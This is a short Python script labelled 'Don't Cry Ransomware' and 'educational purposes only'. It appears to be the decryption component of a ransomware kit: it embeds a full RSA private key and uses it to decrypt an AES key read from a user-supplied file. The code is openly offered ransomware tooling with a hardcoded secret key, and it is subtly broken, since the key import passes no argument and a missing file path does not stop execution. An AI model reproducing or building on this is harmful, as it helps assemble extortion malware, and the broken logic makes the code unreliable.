################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################

import os

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from colorama import Fore, init

init(autoreset=True)

RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
MIIEqAIBAAKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/g
OID2EEoF2Gs44BKj1C5UJsP8MyFHhWKob+WVA2vkUca2ZkA4EYxelivKGaEQlUmn
BQJsrmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuByd
KlcpxwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992j
FJ3j8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxd
tH80fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQABAoIBAAk38yeYiRlVxu2G
Fqg6pWcbdPhNVP/FtSuahB85Mb+GN+3sPoLtvxDn/uFGdvf5vjR4nne2nZolO6Tr
+M7tOXZzeO/n3steuUZKvYs9ZXGtCorpsrWcprvfnhXf1KMIIUffSnS2UX/rGCMA
2wf/yHKqAnWa6rcmghhu7+/FLINO5Y24lQ4KPA/crWc1LGedG264WWPwP1juKqCk
7JeS9RTSMHlU7doZeay9fW2kK2x+O0ieoYbiIXQzPb5ebuJnD8XLPPyjqxmoHEfd
WuYUFsgosmvVsLbhs+Vqv37RkD8K1wMnJVGCm1ScOkRAKcU9K8zLSsGIdTZmw9hp
81wpcOECgYkAk0baucx17R0bG71CJVXVwa5EeGV4A1EFf/HzabffCO3E9FES5JQl
hWiFB8gy4io5KUMc5VtDdlV+5uWEMellapFBJyv9Z7zcKSEs5qVOZKe4a43SCxFz
gv/JXC2uWTTMbspf2Q5oLw62lLECuZLuXLrkcoee8MdsZkqV03n3YX2L6SafzQUr
DQJ5APaEJZT9ib5LEgA0JFMgpd8Qp/BBnyivw77qbPKRuiEDvxWhtE3jVwKDybP3
IfHFD9gwwaokY33T39Cu/QdGh/K+RmPrLV+0l+DsC9bNQUou44qZelUQncvx9UCC
mkvklkuqqm9NRY/KfXaHrhokXGbH3eIMXmssSwKBiECsTaJneaWNMXlF68UPY1Ww
3BpunHwAWUTtD7Ht74AxQVr0OzKrJ6rk0f4v2MBeQEmxUgAZyo8tThPA2AM+9a0N
ain0dEvYsGlTSy9higJDcIWyenknyazN/DOBT92WhOtl7R8Y54E6mczDymmJbyjD
XUw55/7d4+kreY2rMonaItVYg7X5PgUCeHzqP4T86KSFs8xon5OD8qlS7lZ/WiAq
2HzQm35bO77pABX9B7mEHp4Gm9nWu9ugKMQ7CJenssaa60n6sfrS0aa+pjqRfD+H
6oIt+l3RSmlF00VzOhsKvXsP01/qDjew0DvtcknOFRak2+iJHj7e9/eZBaU68UlL
ewKBiCUQmGSESlvfKEyGkR9h0ieCvM/8xh0WgNqWnLztWtEhF/fTMVkuqFxqrVbc
QgNRtXbP/ulZU8c8xyiIW1O4urxsgEzXB5Fcf870D9g1THPoVCfnQQZNWt1Hblop
rz9v0fKUbjGqZGd/5hMzmWL6Lg2AnsxBXSCjEqm1x6SFuJMMmkmOMkWwANY=
-----END RSA PRIVATE KEY-----"""


def decrypt_key(encrypted_key):
    private_key = RSA.import_key()
    cipher_rsa = PKCS1_OAEP.new(private_key)
    aes_key = cipher_rsa.decrypt(encrypted_key)
    return aes_key


if __name__ == "__main__":
    path = input("Enter the file path: ")
    if not os.path.exists(path):
        print(f"{Fore.LIGHTRED_EX}Please enter an existing file path!")
    with open(path, "rb") as f:
        encrypted_key = f.read()
    decrypted_key = decrypt_key(encrypted_key)
    print(decrypted_key)
